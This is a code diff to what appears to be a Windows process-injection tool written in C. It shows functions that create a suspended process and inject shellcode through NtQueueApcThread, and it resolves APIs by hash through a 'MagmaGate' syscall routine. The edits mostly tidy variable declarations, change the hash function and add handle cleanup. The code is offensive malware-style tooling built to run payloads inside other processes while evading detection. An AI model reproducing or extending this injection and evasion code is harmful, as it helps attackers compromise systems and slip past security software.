@@ -13,8 +13,8 @@ BOOL CreateSuspendedProcess
 )
 {
 
-	BOOL State = TRUE;
-	STARTUPINFOA StartupInfo;
+	BOOL				State = TRUE;
+	STARTUPINFOA		StartupInfo;
 	PROCESS_INFORMATION ProcessInfo;
 
 	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
@@ -59,18 +59,18 @@ BOOL ApcInject
 
 {
 
-	NTSTATUS STATUS = NULL;
-	BOOL State = TRUE;
-	PVOID rBuffer = NULL;
-	HANDLE NtdllHandle = NULL;
-	SIZE_T sBytesWritten = NULL;
-	DWORD dwOldProt = NULL;
-	PUCHAR localBuf = NULL;
-	SIZE_T origSize = sShellSize;
-	SIZE_T regionSize = sShellSize;
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };
+	NTSTATUS				STATUS			= STATUS_SUCCESS;
+	BOOL					State			= TRUE;
+	PVOID					rBuffer			= NULL;
+	HANDLE					NtdllHandle		= NULL;
+	SIZE_T					sBytesWritten	= 0;
+	DWORD					dwOldProt		= 0;
+	PUCHAR					localBuf		= NULL;
+	SIZE_T					origSize		= sShellSize;
+	SIZE_T					regionSize		= sShellSize;
+	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
+	SYSCALL_INFO			info			= { 0 };
+	INSTRUCTIONS_INFO		syscallInfos[4] = { 0 };
 
 
 	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellSize);
@@ -107,10 +107,8 @@ BOOL ApcInject
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -175,6 +173,15 @@ BOOL ApcInject
 	}
 
 	OKAY("[ 0x%p ] Executed payload using NtQueueApcThread", rBuffer);
+
+	if (hProcess)
+		CloseHandle(hProcess);
+
+	if (hThread)
+		CloseHandle(hThread);
+
+	if (rBuffer)
+		VirtualFree(rBuffer, 0, MEM_RELEASE);
 
 	return TRUE;
 
